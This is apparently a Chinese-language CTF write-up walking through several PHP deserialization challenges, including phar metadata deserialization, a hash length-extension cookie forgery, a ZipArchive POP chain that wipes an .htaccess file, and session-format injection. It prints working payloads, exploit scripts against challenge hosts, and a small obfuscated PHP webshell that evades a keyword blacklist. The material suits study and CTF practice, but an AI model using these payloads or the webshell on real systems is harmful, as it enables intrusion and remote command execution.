O:3:"acp":3:{S:9:"\00*\00cinder";O:3:"ace":3:{s:8:"filename";s:19:"../nssctfasdasdflag";s:9:"openstack";N;s:6:"docker";N;}s:7:"neutron";N;s:4:"nova";N;}
```

后续查flag，发现这里利用的是 `NULL===NULL`​ 绕过的

```php
$this->openstack = unserialize($this->docker);
$this->openstack->neutron = $heat;
if($this->openstack->neutron === $this->openstack->nova)
```

我们传入的docker是空，就没有反序列化，所以 `openstack`​ 就没有属性 ，所以 `neutron === nove`​ 就都是null，就可以绕过了

#### [NSSCTF]prize_p1

审代码，这题是真不会了，参考[prize_p1](https://www.nbri.cn/news/955.html)

```php
<?php
highlight_file(__FILE__);
class getflag {
    function __destruct() {
        echo getenv("FLAG");
    }
}

class A {
    public $config;
    function __destruct() {
        if ($this->config == 'w') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            file_put_contents("./tmp/a.txt", $data);
        } else if ($this->config == 'r') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            echo file_get_contents($data);
        }
    }
}
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) {
    die("我知道你想干吗，我的建议是不要那样做。");
}
unserialize($_GET[0]);
throw new Error("那么就从这里开始起航吧");

```

一开始没注意最后的 `throw new Error`​ 如果这个抛出错误的时候，就会运行终止，就无法触发 `__destruct`​方法

这里学到了__destruct有三个触发方法

* 程序正常结束
* 主动调用unset($a)
* 将原先指向类的变量取消对类的引用，比如

  ```php
  <?php
  class marin{
      function __destruct(){
          echo "marin";
      }
  }

  $a = new marin();
  $a = 1;


  echo '123';

  // marin123
  ```

  这里先输出了marin，就证明了在结束之前就调用了这个方法

  ```
  这个就是php中的垃圾回收机制，也叫GC，当一个对象没有被引用时，php就会将其视为垃圾，回收过程中就会触发析构函数
  ```

这里卡了好久，问的李师傅才发现，卡住的是获取flag的`__destruct`​，而不是最开是传文件的 `__destruct`​

这里传的是phar文件进行反序列化

> ​`phar://`​伪协议
>
> 这个是php解压缩的一个函数，不管后缀是什么，都可以当作压缩包解压，哪怕是txt文件，所以将木马文件压缩后，改成任意格式都可以正常使用
>
> phar文件
>
> 这个是php中类似JAR的一种打包文件，本质是一种压缩文件
>
> phar文件结构
>
> ```
> 1. stub
> 标识这个是一个phar文件，__HALT_COMPILER();必须以这个结尾，前面内容不限
> 2. manifest
> 存储的是每个被压缩文件的权限、属性等信息，这部分还会以序列化形式存储用户自定义的meta-data，这里就是反序列化的漏洞点
> 3. contents
> 文件内容
> 4. signature
> 签名，验证文件
> ```
>
> 签名结构
>
> |长度|内容|
> | --------| -----------------------------------------------------------|
> |看类型|sha1为20字节<br />md5为16字节<br />sha256为32字节<br />sha512为64字节|
> |4字节|签名类型<br />1代表md5，2代表sha1，3代表sha256，4代表sha512，|
> |4字节|GBMB标识|
>
> 发生反序列化的原因  
> 当用phar://读取文件时，文件会被解析成phar文件  
> 然后会触发php_var_unserialize()对meta-data的操作，触发反序列化

根据这些知识点，我们要怎么传呢

首先，我们要写入的数据是

```php
a:2:{i:0;O:7:"getflag":0:{}i:0;N;}
```

> 这是一个数组类型，当反序列化之后，先会将 `i:0`​ 的读取，赋值给这个数组，一个getflag的类，然后再往后读，又是一个  `i:0`​ ，重新赋值，将nul赋值给了这个数组，导致 `getflag`​ 取消了引用，触发了函数

```php
<?php
    class getflag {
        function __destruct() {
            echo getenv("FLAG");
        }
    }
    
    $a = new getflag();
    $a = array(0=>$a,1=>null);

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

    $phar->setMetadata($a); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>

```

抄了一个脚本，但是这里给的结果会是

```php
a:2:{i:0;O:7:"getflag":0:{}i:1;N;}
```

所以我们还要修改文件的值，并且修改签名

![image-20250321224739540](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250321224739540.png)

这里我们可以看到是sha256的加密

```python
from hashlib import sha256
with open("phar.phar",'rb') as f:
   text=f.read()
   main=text[:-40]        #正文部分(除去最后40字节)
   end=text[-8:]		  #最后八位也是不变的	
   new_sign=sha256(main).digest()
   new_phar=main+new_sign+end
   open("phar.phar",'wb').write(new_phar)     #将新生成的内容以二进制方式覆盖写入原来的phar文件
```

用脚本修改

然后再写入  
这里对文件还有过滤，因为里面是明文，会过滤掉flag，可以用数组绕过来传入

```python
import requests
import re

url = 'http://node4.anna.nssctf.cn:28233/'

# 写入文件
with open('phar.phar','rb') as f:
    data1 = {'0[]': f.read()}
    param1 = {0:'O:1:"A":1:{s:6:"config";s:1:"w";}'}
    p1 = requests.post(url=url,data=data1,params=param1)
   

# 读取文件
param2 = {0:'O:1:"A":1:{s:6:"config";s:1:"r";}'}
data2 = {0:'phar://./tmp/a.txt'}
p2 = requests.post(url=url,data=data2,params=param2)
p2.encoding = 'utf-8'
print(p2.text)
```

成功获取到flag

#### [HUBUCTF 2022 新生赛]checkin

```php
<?php
show_source(__FILE__);
$username  = "this_is_secret"; 
$password  = "this_is_not_known_to_you"; 
include("flag.php");//here I changed those two 
$info = isset($_GET['info'])? $_GET['info']: "" ;
$data_unserialize = unserialize($info);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo $flag;
}else{
    echo "username or password error!";

}

?>
```

这题好像更多考的是php弱比较

因为在flag.php中修改了username和password，所以其实是不知道的就开始瞎尝试

这里用ture比较就行

```php
<?php
$data = [
    'username' => true,
    'password' => true
];

$serialized = serialize($data);
echo $serialized;
```

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

但是在尝试的时候，发现了用0可以获取flag，但是本地的php却没过

```php
a:2:{s:8:"username";i:0;s:8:"password";i:0;}
```

> php弱比较在比较不同类型的值时，会转换回相同类型再比较
>
> 字符串或非数字字符串 => 0  
> 空字符串或 " 0 " => 0  
> 布尔值false => 0
>
> 本地没过可能是因为php8.0之后对字符串到数字的转换规则进行了调整，字符串无法完全解析为数字，则回触发typeError或0，导致失败

#### [ByteCTF 2019]EZCMS

本来是想做道phar的题的，结果第一步过不去（

开局一个登陆框，试了个admin 123456就进去了，还以为就是弱密码，上传文件，发现`u r not admin`​

重新回到登录框，发现啥都能进入orz

然后不会开始找东西，发现www.zip有源码，开始审计

在上传文件的这个页面

```php
<?php
include ("config.php");
if (isset($_FILES['file'])){
    $file_tmp = $_FILES['file']['tmp_name'];
    $file_name = $_FILES['file']['name'];
    $file_size = $_FILES['file']['size'];
    $file_error = $_FILES['file']['error'];
    if ($file_error > 0){
        die("something error");
    }
    
    $admin = new Admin($file_name, $file_tmp, $file_size);
    $admin->upload_file();
}else{
    $sandbox = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']);
    if (!file_exists($sandbox)){
        mkdir($sandbox, 0777, true);
    }
    if (!is_file($sandbox.'/.htaccess')){
        file_put_contents($sandbox.'/.htaccess', 'lolololol, i control all');
    }
    echo "view my file : "."<br>";
    $path = "./".$sandbox;
    $dir = opendir($path);
    while (($filename = readdir($dir)) !== false){
        if ($filename != '.' && $filename != '..'){
            $files[] = $filename;
        }
    }
    foreach ($files as $k=>$v){
        $filepath = $path.'/'.$v;
        echo <<<EOF
        <div style="width: 1000px; height: 30px;">
        <Ariel>filename: {$v}</Ariel>
        <a href="view.php?filename={$v}&filepath={$filepath}">view detail</a>
</div>
EOF;
    }
    closedir($dir);

}
```

这个会读取文件的类型，名字，大小  
然后创建一个新的类Admin，顺着找

```php
class Admin{
    public $size;
    public $checker;
    public $file_tmp;
    public $filename;
    public $upload_dir;
    public $content_check;

    function __construct($filename, $file_tmp, $size)
    {
        $this->upload_dir = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']);
        if (!file_exists($this->upload_dir)){
            mkdir($this->upload_dir, 0777, true);
        }
        if (!is_file($this->upload_dir.'/.htaccess')){
            file_put_contents($this->upload_dir.'/.htaccess', 'lolololol, i control all');
        }
        $this->size = $size;
        $this->filename = $filename;
        $this->file_tmp = $file_tmp;
        $this->content_check = new Check($this->file_tmp);
        $profile = new Profile();
        $this->checker = $profile->is_admin();
    }

    public function upload_file(){

        if (!$this->checker){
            die('u r not admin');
        }
        $this->content_check -> check();
        $tmp = explode(".", $this->filename);
        $ext = end($tmp);
        if ($this->size > 204800){
            die("your file is too big");
        }
        move_uploaded_file($this->file_tmp, $this->upload_dir.'/'.md5($this->filename).'.'.$ext);
    }

    public function __call($name, $arguments)
    {

    }
}
```

这个文件会触发 `__construct`​，要传到sandbow的地方  
然后创建一个 `Profile`​ 类，并找到 `is_admin`​ 方法  
然后上传页面会触发 `upload_file`​ 方法，调用 `is_admin`​ 方法

```php
class Profile{

    public $username;
    public $password;
    public $admin;

    public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;

    }
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
```

这个方法的 `is_admin`​ 方法会拿到username和password  
要求username是admin，并且password不是admin

```php
function login(){

    $secret = "********";
    setcookie("hash", md5($secret."adminadmin"));
    return 1;

}

function is_admin(){
    $secret = "********";
    $username = $_SESSION['username'];
    $password = $_SESSION['password'];
    if ($username == "admin" && $password != "admin"){
        if ($_COOKIE['user'] === md5($secret.$username.$password)){
            return 1;
        }
    }
    return 0;
}
```

在index登录后，会加上这个hash值，用`secret`​和`adminadmin`​md5加密  
只有当这个hash值和 `$secret.$username.$password`​ 加密的相等，才能上传文件

这里就不会了，参考[[ByteCTF 2019]EZCMS 详解（hash长度扩展攻击+phar反序列化）-CSDN博客](https://blog.csdn.net/qq_45699846/article/details/123674861)学的

思路就是拿到：`secret`​ 的md5值、`secret`​ 的长度、可预测的 `secret + padding + 任意字符串s`​ 的md5值

* 进一步：`secret + 已知str`​ 的md5值、`secret`​ 的长度、可预测的 `secret + 已知str + padding + 任意字符串s`​ 的md5值

> md5值每次处理的长度为512bits，但是实际的长度不一定是，padding就是用来补全这一部分的

回到这题的信息  
​` md5($secret."adminadmin")`​：52107b08c0f3342d2153ae1d68e6262c  
secret的长度：根据源码的提示，应该是8位

因为hashpump的库好像已经被删了，就找到了另一个类似的工具

![image-20250324165823081](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250324165823081.png)

用户名：admin  
密码：`admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00aaa`​  
cookie：`user：49046479e6d9e193d9a4937af1f764f4`​

![image-20250324170332054](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250324170332054.png)

成功将文件上传上去了，但是还有限制

```php
class Check{
    public $filename;

    function __construct($filename)
    {
        $this->filename = $filename;
    }

    function check(){
        $content = file_get_contents($this->filename);
        $black_list = ['system','eval','exec','+','passthru','`','assert'];
        foreach ($black_list as $k=>$v){
            if (stripos($content, $v) !== false){
                die("your file make me scare");
            }
        }
        return 1;
    }
}
```

![image-20250324170743284](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250324170743284.png)

这里有个 `.htaccess`​ 文件，应该是这个把php文件什么都给ban了，所以无法使用php文件

看到view.php，发现会创建一个file类

```php
<?php
error_reporting(0);
include ("config.php");
$file_name = $_GET['filename'];
$file_path = $_GET['filepath'];
$file_name=urldecode($file_name);
$file_path=urldecode($file_path);
$file = new File($file_name, $file_path);
$res = $file->view_detail();
$mine = $res['mine'];
$store_path = $res['store_path'];

echo <<<EOT
<div style="height: 30px; width: 1000px;">
<Ariel>mine: {$mine}</Ariel><br>
</div>
<div style="height: 30px; ">
<Ariel>file_path: {$store_path}</Ariel><br>
</div>
EOT;
```

```php
class File{

    public $filename;
    public $filepath;
    public $checker;

    function __construct($filename, $filepath)
    {
        $this->filepath = $filepath;
        $this->filename = $filename;
    }

    public function view_detail(){

        if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)){
            die("nonono~");
        }
        $mine = mime_content_type($this->filepath);
        $store_path = $this->open($this->filename, $this->filepath);
        $res['mine'] = $mine;
        $res['store_path'] = $store_path;
        return $res;

    }

    public function open($filename, $filepath){
        $res = "$filename is in $filepath";
        return $res;
    }

    function __destruct()
    {
        if (isset($this->checker)){
            $this->checker->upload_file();
        }
    }

}
```

这里有个重要的函数，就是 `mime_content_type`​ 这个可以触发反序列化  
目的就是要删除或者重写这个 `.htaccess`​ 文件

在profile的`__call`​方法中可以使用open方法，发现在`ZipArchive`​类中有`open`​这个方法

![image-20250324172728101](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250324172728101.png)

还发现了一个模式**​`ZIPARCHIVE::OVERWRITE`​**​，利用这个方法，可以打开文件并置空

![image-20250324171927590](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250324171927590.png)

反推构造pop链  
在profile的`__call`​方法中使用open方法  
要触发这个方法，就用File的 `__destruct`​ 方法，会访问checker的`upload_file()`​触发 `__call`​

```php
<?php
class File{
    public $checker;
}

class Profile{
    public $username = './sandbox/c5d339ad7f118f9541b5ec942bb58281/.htaccess';
    public $password = ZipArchive::OVERWRITE;
    public $admin;
}

$a = new Profile();
$b = new File();

$b->checker = $a;
$a->admin = new ZipArchive();

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$phar->setMetadata($b); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

先传一个马上去

```php
<?php
$a = 'Syst'."em";
($a)($_POST['cmd']);
?>
```

然后再将phar文件上传

![image-20250324175321870](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250324175321870.png)

上面的代码还过滤了phar协议

```php
if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)){
            die("nonono~");
        }
```

不能以这个协议开头，用 `php://filter/read=convert.base64-encode/resource=`​ 来读取绕过，先通过phar反序列化，然后才读取

```
view.php?filename=9c7f4a2fbf2dd3dfb7051727a644d99f.phar&filepath=php://filter/read=convert.base64-encode/resource=phar://sandbox/c5d339ad7f118f9541b5ec942bb58281/9c7f4a2fbf2dd3dfb7051727a644d99f.phar
```

利用反序列化删除 `.htaccess`​ 文件，最后访问php执行命令![image-20250324175406294](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250324175406294.png)

‍

#### [hgame2022]一本单词书

进入页面，先是一个登录框，有源码提示，我们的靶场直接给了

先看 `login.php`​ 查看怎么登录

```php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isset($_POST['username']) || !isset($_POST['password'])) {
        return;
    }

    if ($_POST['username'] != 'adm1n') {
        die(alert('username or password is invalid'));
    }

    if (is_numeric($_POST['password'])) {
        die(alert('密码不能设置为纯数字，我妈都知道(￣△￣；)'));
    } else {
        if ($_POST['password'] == 1080) {
            $_SESSION['username'] = 'admin';
            $_SESSION['unique_key'] = md5(randomString(8));
            header('Location: index.php');
        } else {
            die(alert('这你都能输错？'));
        }
    }
}
```

主要就是这一段，只要用户名和密码对应就行，用户名 `adm1n`​ 密码是一个弱比较 `1080a`​ 就行

然后审计别的源码，两个比较关键 `save.php`​ 和 `get.php`​

主要应该就是两个方法和 `evil`​ 类

看的时候有点晕（，没仔细看

解析一下

```php
function encode($data): string {
    $result = '';
    foreach ($data as $k => $v) {
        $result .= $k . '|' . serialize($v);
    }

    return $result;
}
```

这个data数据是从index的页面传入的，将每次传入的数据重新组合在一起

假设传入的数据是 `data = {'a':'b','name':'marin'}`​ 就会加密为 `result = a|s:1:"b";name|s:5:"marin"`​

然后是解密的

```php
function decode(string $data): Array {
    $result = [];
    $offset = 0;
    $length = \strlen($data);
    while ($offset < $length) {
        if (!strstr(substr($data, $offset), '|')) {
            return [];
        }
        $pos = strpos($data, '|', $offset);
        $num = $pos - $offset;
        $varname = substr($data, $offset, $num);
        $offset += $num + 1;
        $dataItem = unserialize(substr($data, $offset));

        $result[$varname] = $dataItem;
        $offset += \strlen(serialize($dataItem));
    }
    return $result;
}
```

这个其实就相当于将前面的解密

将每个的键值对分开，然后反序列化

要反序列化攻击的应该就是这个类

```php
class Evil {
    public $file;
    public $flag;

    public function __wakeup() {
        $content = file_get_contents($this->file);
        if (preg_match("/hgame/", $content)) {
            $this->flag = 'hacker!';
        }
        $this->flag = $content;
    }
}
```

可以发现这个 if 的判断其实没啥用，只要将 file 设置成 flag的位置就行

这里 encode 是看的wp才理解了

当传入的键包含 `|`​ 时，就可以注入任意反序列化的数据

​`{"a|s:2:"22";b":"2"}`​ 就是传入的是 `a|s:2:\"22\";b`​ 和 `2`​  
然后加密后的数据就是 `a|s:2:"22";b|s:1:"2"`​  
最后解密就得到 `{"a":"22";"b":"2"}`​

![image](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20250508194015.png)

所以就利用这个漏洞，将 evil 类反序列数据传入  `marin|O:4:"Evil":2:{s:4:"file";s:5:"/flag";s:4:"flag";N;};c`​ 和 `123`​

![image](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20250508194514.png)
